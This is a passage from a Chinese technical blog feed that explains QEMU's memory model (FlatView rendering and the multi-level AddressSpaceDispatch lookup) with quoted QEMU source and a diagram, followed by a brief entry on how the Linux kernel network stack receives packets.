class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">address_space_update_topology</span><span class="params">(AddressSpace *as)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegion *physmr = memory_region_get_flatview_root(as-&gt;root);</span><br><span class="line"></span><br><span class="line">    flatviews_init();</span><br><span class="line">    <span class="keyword">if</span> (!g_hash_table_lookup(flat_views, physmr)) &#123;</span><br><span class="line">        generate_memory_topology(physmr);</span><br><span class="line">    &#125;</span><br><span class="line">    address_space_set_flatview(as);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Render a memory topology into a list of disjoint absolute ranges. */</span></span><br><span class="line"><span class="type">static</span> FlatView *<span class="title function_">generate_memory_topology</span><span class="params">(MemoryRegion *mr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    FlatView *view;</span><br><span class="line"></span><br><span class="line">    view = flatview_new(mr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mr) &#123;</span><br><span class="line">        render_memory_region(view, mr, int128_zero(),</span><br><span class="line">                             addrrange_make(int128_zero(), int128_2_64()),</span><br><span class="line">                             <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    flatview_simplify(view);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> view;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Render a memory region into the global view.  Ranges in @view obscure</span></span><br><span class="line"><span class="comment"> * ranges in @mr.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">render_memory_region</span><span class="params">(FlatView *view,</span></span><br><span class="line"><span class="params">                                 MemoryRegion *mr,</span></span><br><span class="line"><span class="params">                                 Int128 base,</span></span><br><span class="line"><span class="params">                                 AddrRange clip,</span></span><br><span class="line"><span class="params">                                 <span class="type">bool</span> readonly,</span></span><br><span class="line"><span class="params">                                 <span class="type">bool</span> nonvolatile,</span></span><br><span class="line"><span class="params">                                 <span class="type">bool</span> unmergeable)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegion *subregion;</span><br><span class="line">    <span class="type">unsigned</span> i;</span><br><span class="line">    hwaddr offset_in_region;</span><br><span class="line">    Int128 remain;</span><br><span class="line">    Int128 now;</span><br><span class="line">    FlatRange fr;</span><br><span class="line">    AddrRange tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mr-&gt;enabled) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int128_addto(&amp;base, int128_make64(mr-&gt;addr));</span><br><span class="line">    readonly |= mr-&gt;readonly;</span><br><span class="line">    nonvolatile |= mr-&gt;nonvolatile;</span><br><span class="line">    unmergeable |= mr-&gt;unmergeable;</span><br><span class="line"></span><br><span class="line">    tmp = addrrange_make(base, mr-&gt;size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!addrrange_intersects(tmp, clip)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clip = addrrange_intersection(tmp, clip);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mr-&gt;alias) &#123;</span><br><span class="line">        int128_subfrom(&amp;base, int128_make64(mr-&gt;alias-&gt;addr));</span><br><span class="line">        int128_subfrom(&amp;base, int128_make64(mr-&gt;alias_offset));</span><br><span class="line">        render_memory_region(view, mr-&gt;alias, base, clip,</span><br><span class="line">                             readonly, nonvolatile, unmergeable);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Render subregions in priority order. */</span></span><br><span class="line">    QTAILQ_FOREACH(subregion, &amp;mr-&gt;subregions, subregions_link) &#123;</span><br><span class="line">        render_memory_region(view, subregion, base, clip,</span><br><span class="line">                             readonly, nonvolatile, unmergeable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!mr-&gt;terminates) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset_in_region = int128_get64(int128_sub(clip.start, base));</span><br><span class="line">    base = clip.start;</span><br><span class="line">    remain = clip.size;</span><br><span class="line"></span><br><span class="line">    fr.mr = mr;</span><br><span class="line">    fr.dirty_log_mask = memory_region_get_dirty_log_mask(mr);</span><br><span class="line">    fr.romd_mode = mr-&gt;romd_mode;</span><br><span class="line">    fr.readonly = readonly;</span><br><span class="line">    fr.nonvolatile = nonvolatile;</span><br><span class="line">    fr.unmergeable = unmergeable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Render the region itself into any gaps left by the current view. */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; view-&gt;nr &amp;&amp; int128_nz(remain); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (int128_ge(base, addrrange_end(view-&gt;ranges[i].addr))) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (int128_lt(base, view-&gt;ranges[i].addr.start)) &#123;</span><br><span class="line">            now = int128_min(remain,</span><br><span class="line">                             int128_sub(view-&gt;ranges[i].addr.start, base));</span><br><span class="line">            fr.offset_in_region = offset_in_region;</span><br><span class="line">            fr.addr = addrrange_make(base, now);</span><br><span class="line">            flatview_insert(view, i, &amp;fr);</span><br><span class="line">            ++i;</span><br><span class="line">            int128_addto(&amp;base, now);</span><br><span class="line">            offset_in_region += int128_get64(now);</span><br><span class="line">            int128_subfrom(&amp;remain, now);</span><br><span class="line">        &#125;</span><br><span class="line">        now = int128_sub(int128_min(int128_add(base, remain),</span><br><span class="line">                                    addrrange_end(view-&gt;ranges[i].addr)),</span><br><span class="line">                         base);</span><br><span class="line">        int128_addto(&amp;base, now);</span><br><span class="line">        offset_in_region += int128_get64(now);</span><br><span class="line">        int128_subfrom(&amp;remain, now);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (int128_nz(remain)) &#123;</span><br><span class="line">        fr.offset_in_region = offset_in_region;</span><br><span class="line">        fr.addr = addrrange_make(base, remain);</span><br><span class="line">        flatview_insert(view, i, &amp;fr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Attempt to simplify a view by merging adjacent ranges */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">flatview_simplify</span><span class="params">(FlatView *view)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> i, j, k;</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; view-&gt;nr) &#123;</span><br><span class="line">        j = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; view-&gt;nr</span><br><span class="line">               &amp;&amp; can_merge(&amp;view-&gt;ranges[j<span class="number">-1</span>], &amp;view-&gt;ranges[j])) &#123;</span><br><span class="line">            int128_addto(&amp;view-&gt;ranges[i].addr.size, view-&gt;ranges[j].addr.size);</span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">for</span> (k = i; k &lt; j; k++) &#123;</span><br><span class="line">            memory_region_unref(view-&gt;ranges[k].mr);</span><br><span class="line">        &#125;</span><br><span class="line">        memmove(&amp;view-&gt;ranges[i], &amp;view-&gt;ranges[j],</span><br><span class="line">                (view-&gt;nr - j) * <span class="keyword">sizeof</span>(view-&gt;ranges[j]));</span><br><span class="line">        view-&gt;nr -= j - i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到，生成<strong>FlatView</strong>整体可分为两步，首先通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L708"><strong>memory_region_get_flatview_root()</strong></a>获取<strong>AddressSpace</strong>对应的<strong>树状MemoryRegion</strong>根，其次通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/memory.c#L753"><strong>generate_memory_topology()</strong></a>平坦化地址空间。</p><p>其中<strong>generate_memory_topology</strong>的逻辑也相对比较清晰:通过<strong>DFS</strong>遍历整棵树即可平坦化。</p><h2 id="内存分派"><a href="#内存分派" class="headerlink" title="内存分派"></a>内存分派</h2><p>虽然Qemu已经通过<strong>FlatView</strong>加快了<strong>AddressSpace</strong>地址对应的<strong>MemoryRegion</strong>的查找，但还可以使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L130"><strong>struct AddressSpaceDispatch</strong></a>以类似页表的形式进一步加快查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddressSpaceDispatch</span> &#123;</span></span><br><span class="line">    MemoryRegionSection *mru_section;</span><br><span class="line">    <span class="comment">/* This is a multi-level map on the physical address space.</span></span><br><span class="line"><span class="comment">     * The bottom level has pointers to MemoryRegionSections.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PhysPageEntry phys_map;</span><br><span class="line">    PhysPageMap <span class="built_in">map</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct MemoryRegionSection: describes a fragment of a #MemoryRegion</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @mr: the region, or %NULL if empty</span></span><br><span class="line"><span class="comment"> * @fv: the flat view of the address space the region is mapped in</span></span><br><span class="line"><span class="comment"> * @offset_within_region: the beginning of the section, relative to @mr&#x27;s start</span></span><br><span class="line"><span class="comment"> * @size: the size of the section; will not exceed @mr&#x27;s boundaries</span></span><br><span class="line"><span class="comment"> * @offset_within_address_space: the address of the first byte of the section</span></span><br><span class="line"><span class="comment"> *     relative to the region&#x27;s address space</span></span><br><span class="line"><span class="comment"> * @readonly: writes to this section are ignored</span></span><br><span class="line"><span class="comment"> * @nonvolatile: this section is non-volatile</span></span><br><span class="line"><span class="comment"> * @unmergeable: this section should not get merged with adjacent sections</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">MemoryRegionSection</span> &#123;</span></span><br><span class="line">    Int128 size;</span><br><span class="line">    MemoryRegion *mr;</span><br><span class="line">    FlatView *fv;</span><br><span class="line">    hwaddr offset_within_region;</span><br><span class="line">    hwaddr offset_within_address_space;</span><br><span class="line">    <span class="type">bool</span> readonly;</span><br><span class="line">    <span class="type">bool</span> nonvolatile;</span><br><span class="line">    <span class="type">bool</span> unmergeable;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PhysPageEntry</span> &#123;</span></span><br><span class="line">    <span class="comment">/* How many bits skip to next level (in units of L2_SIZE). 0 for a leaf. */</span></span><br><span class="line">    <span class="type">uint32_t</span> skip : <span class="number">6</span>;</span><br><span class="line">     <span class="comment">/* index into phys_sections (!skip) or phys_map_nodes (skip) */</span></span><br><span class="line">    <span class="type">uint32_t</span> ptr : <span class="number">26</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the L2 (and L3, etc) page tables.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADDR_SPACE_BITS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P_L2_BITS 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P_L2_SIZE (1 &lt;&lt; P_L2_BITS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> P_L2_LEVELS (((ADDR_SPACE_BITS - TARGET_PAGE_BITS - 1) / P_L2_BITS) + 1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> PhysPageEntry Node[P_L2_SIZE];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PhysPageMap</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> sections_nb;</span><br><span class="line">    <span class="type">unsigned</span> sections_nb_alloc;</span><br><span class="line">    <span class="type">unsigned</span> nodes_nb;</span><br><span class="line">    <span class="type">unsigned</span> nodes_nb_alloc;</span><br><span class="line">    Node *nodes;</span><br><span class="line">    MemoryRegionSection *sections;</span><br><span class="line">&#125; PhysPageMap;</span><br></pre></td></tr></table></figure><p>Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/system/physmem.c#L336"><strong>address_space_lookup_region()</strong></a>完成地址分派，逻辑如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from RCU critical section */</span></span><br><span class="line"><span class="type">static</span> MemoryRegionSection *<span class="title function_">address_space_lookup_region</span><span class="params">(AddressSpaceDispatch *d,</span></span><br><span class="line"><span class="params">                                                        hwaddr addr,</span></span><br><span class="line"><span class="params">                                                        <span class="type">bool</span> resolve_subpage)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegionSection *section = qatomic_read(&amp;d-&gt;mru_section);</span><br><span class="line">    <span class="type">subpage_t</span> *subpage;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!section || section == &amp;d-&gt;<span class="built_in">map</span>.sections[PHYS_SECTION_UNASSIGNED] ||</span><br><span class="line">        !section_covers_addr(section, addr)) &#123;</span><br><span class="line">        section = phys_page_find(d, addr);</span><br><span class="line">        qatomic_set(&amp;d-&gt;mru_section, section);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> section;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> MemoryRegionSection *<span class="title function_">phys_page_find</span><span class="params">(AddressSpaceDispatch *d, hwaddr addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    PhysPageEntry lp = d-&gt;phys_map, *p;</span><br><span class="line">    Node *nodes = d-&gt;<span class="built_in">map</span>.nodes;</span><br><span class="line">    MemoryRegionSection *sections = d-&gt;<span class="built_in">map</span>.sections;</span><br><span class="line">    hwaddr index = addr &gt;&gt; TARGET_PAGE_BITS;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = P_L2_LEVELS; lp.skip &amp;&amp; (i -= lp.skip) &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lp.ptr == PHYS_MAP_NODE_NIL) &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;sections[PHYS_SECTION_UNASSIGNED];</span><br><span class="line">        &#125;</span><br><span class="line">        p = nodes[lp.ptr];</span><br><span class="line">        lp = p[(index &gt;&gt; (i * P_L2_BITS)) &amp; (P_L2_SIZE - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (section_covers_addr(&amp;sections[lp.ptr], addr)) &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;sections[lp.ptr];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &amp;sections[PHYS_SECTION_UNASSIGNED];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>类似于页表地址转换，内存分派使用了6级的map实现了地址到<strong>MemoryRegionSection</strong>的转换。具体来说，<strong>map</strong>中的<strong>Node</strong>类型类似于页表地址转换中的<strong>中间项</strong>，<strong>map</strong>中的<strong>MemoryRegionSection</strong>类似于页表地址转换中最后的物理页，<strong>phys_map</strong>则类似于页表地址转换中的<strong>CR3</strong>寄存器，即第一级Map。具体来说，<strong>map</strong>中的<strong>nodes</strong>数组存放着该<strong>AddressSpace</strong>所有的<strong>Node</strong>，而<strong>sections</strong>数组则存放着所有的<strong>MemoryRegionSection</strong>。<strong>PhysPageEntry</strong>的<strong>ptr</strong>在作为这些数组的下标进行索引，如下所示。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">                                                               ┌─────────────────────┐                </span><br><span class="line">                                                       ┌───────┼───►struct Node      │             gpa</span><br><span class="line">                                                       │       │   ┌────────────┐    │              │ </span><br><span class="line">                                                       │       │ ┌─┼───         │◄───┼──────────────┘ </span><br><span class="line">                                                       │       │ │ ├────────────┤    │                </span><br><span class="line">                                                       │       │ │ │   ......   │    │                </span><br><span class="line">                                                       │       │ │ ├────────────┤    │                </span><br><span class="line">                                                       │       │ │ │            │    │                </span><br><span class="line">                                                       │       │ │ └────────────┘    │                </span><br><span class="line">                                                       │       │ │                   │                </span><br><span class="line">                                                       │       ├─┼───────────────────┤                </span><br><span class="line">                         struct AddressSpaceDispatch   │       │ │   struct Node     │                </span><br><span class="line">                              ┌────────┬─────┐         │       │ │  ┌────────────┐   │                </span><br><span class="line">                              │phys_map│     ├─────────┘       │ └─►│         ───┼─┐ │                </span><br><span class="line">                              ├────────┼─────┤                 │    ├────────────┤ │ │                </span><br><span class="line">                              │map     │     ├──┐              │    │   ......   │ │ │                </span><br><span class="line">                              └────────┴─────┘  │              │    ├────────────┤ │ │                </span><br><span class="line">                                                │              │    │            │ │ │                </span><br><span class="line">                                     ┌──────────┘              │    └────────────┘ │ │                </span><br><span class="line">                                     │                         │                   │ │                </span><br><span class="line">                                     ▼                         ├───────────────────┼─┤                </span><br><span class="line">                            struct PhysPageMap                 │     struct Node   │ │                </span><br><span class="line">                              ┌────────┬───┐                   │    ┌────────────┐ │ │                </span><br><span class="line">                              │nodes   │   ├───────────────────►    │            │ │ │                </span><br><span class="line">┌─────────────────────┐       ├────────┼───┤                   │    ├────────────┤ │ │                </span><br><span class="line">│ MemoryReginSection  │◄──────┤sections│   │                   │    │   ......   │ │ │                </span><br><span class="line">├─────────────────────┤       └────────┴───┘                   │    ├────────────┤ │ │                </span><br><span class="line">│ MemoryReginSection  │                                        │ ┌──┼───         │◄┘ │                </span><br><span class="line">├─────────────────────┤                                        │ │  └────────────┘   │                </span><br><span class="line">│       ......        │                                        │ │                   │                </span><br><span class="line">├─────────────────────┤                                        ├─┼───────────────────┤                </span><br><span class="line">│ MemoryReginSection  │◄───────────┐                           │ │   struct Node     │                </span><br><span class="line">└─────────────────────┘            │                           │ │  ┌────────────┐   │                </span><br><span class="line">                                   │                           │ └─►│         ───┼─┐ │                </span><br><span class="line">                                   │                           │    ├────────────┤ │ │                </span><br><span class="line">                                   │                           │    │   ......   │ │ │                </span><br><span class="line">                                   │                           │    ├────────────┤ │ │                </span><br><span class="line">                                   │                           │    │            │ │ │                </span><br><span class="line">                                   │                           │    └────────────┘ │ │                </span><br><span class="line">                                   │                           │                   │ │                </span><br><span class="line">                                   │                           ├───────────────────┼─┤                </span><br><span class="line">                                   │                           │     struct Node   │ │                </span><br><span class="line">                                   │                           │    ┌────────────┐ │ │                </span><br><span class="line">                                   │                           │  ┌─┼───         │◄┘ │                </span><br><span class="line">                                   │                           │  │ ├────────────┤   │                </span><br><span class="line">                                   │                           │  │ │   ......   │   │                </span><br><span class="line">                                   │                           │  │ ├────────────┤   │                </span><br><span class="line">                                   │                           │  │ │            │   │                </span><br><span class="line">                                   │                           │  │ └────────────┘   │                </span><br><span class="line">                                   │                           │  │                  │                </span><br><span class="line">                                   │                           ├──┼──────────────────┤                </span><br><span class="line">                                   │                           │  │  ...........     │                </span><br><span class="line">                                   │                           ├──┼──────────────────┤                </span><br><span class="line">                                   │                           │  │  struct Node     │                </span><br><span class="line">                                   │                           │  │ ┌────────────┐   │                </span><br><span class="line">                                   │                           │  └►│         ───┼─┐ │                </span><br><span class="line">                                   │                           │    ├────────────┤ │ │                </span><br><span class="line">                                   │                           │    │   ......   │ │ │                </span><br><span class="line">                                   │                           │    ├────────────┤ │ │                </span><br><span class="line">                                   │                           │    │            │ │ │                </span><br><span class="line">                                   │                           │    └────────────┘ │ │                </span><br><span class="line">                                   │                           │                   │ │                </span><br><span class="line">                                   │                           └───────────────────┼─┘                </span><br><span class="line">                                   │                                               │                  </span><br><span class="line">                                   └───────────────────────────────────────────────┘                  </span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://www.cnblogs.com/ccxikka/p/9477530.html">qemu对虚拟机的内存管理（一）</a></li><li><a href="https://martins3.github.io/qemu/memory.html">QEMU 的 memory model</a></li><li><a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as">地址空间</a></li><li><a href="https://66ring.github.io/2021/04/13/universe/qemu/qemu_softmmu/">QEMU的内存模拟</a></li><li><a href="https://blog.csdn.net/leoufung/article/details/48781205">MemoryRegion模型原理，以及同FlatView模型的关系(QEMU2.0.0)</a></li><li><a href="https://www.qemu.org/docs/master/devel/memory.html">The memory API</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网卡与网络栈</title>
      <link href="/2024/04/14/%E7%BD%91%E5%8D%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%A0%88/"/>
      <url>/2024/04/14/%E7%BD%91%E5%8D%A1%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然看到了<strong>arthurchiao</strong>大佬写的<a href="https://arthurchiao.art/blog/linux-net-stack-implementation-rx-zh/">Linux 网络栈接收数据（RX）：原理及内核实现（2022）</a>文章，从中学习到了许多中断子系统和网络子系统的知识，收获颇丰，特别记录一下。</p><h1 id="数据包处理流程"><a href="#数据包处理流程" class="headerlink" title="数据包处理流程"></a>数据包处理流程</h1><p>下图是一个数据包从网卡通过内核网络栈到达用户空间的流程<br><img src="数据包处理流程.png" alt="数据包处理流程"></p><ol><li>网卡通过<strong>DMA</strong>写入数据到设备驱动预留的<strong>ring buffer</strong>中</li><li>网卡产生<strong>IRQ</strong>硬件中断</li><li>软中断处理线程<strong>ksoftirq</strong>基于<strong>ring buffer</strong>生成内核协议栈的数据包<strong>skb</strong></li><li>内核链路层协议栈处理</li><li>内核网络层协议栈处理</li><li>内核传输层协议栈处理</li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://arthurchiao.art/blog/linux-net-stack-implementation-rx-zh/">Linux 网络栈接收数据（RX）：原理及内核实现（2022）</a></li><li><a href="https://nxw.name/2022/linux-network-stack">Linux 内核网络栈</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 内核 </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu基本知识</title>
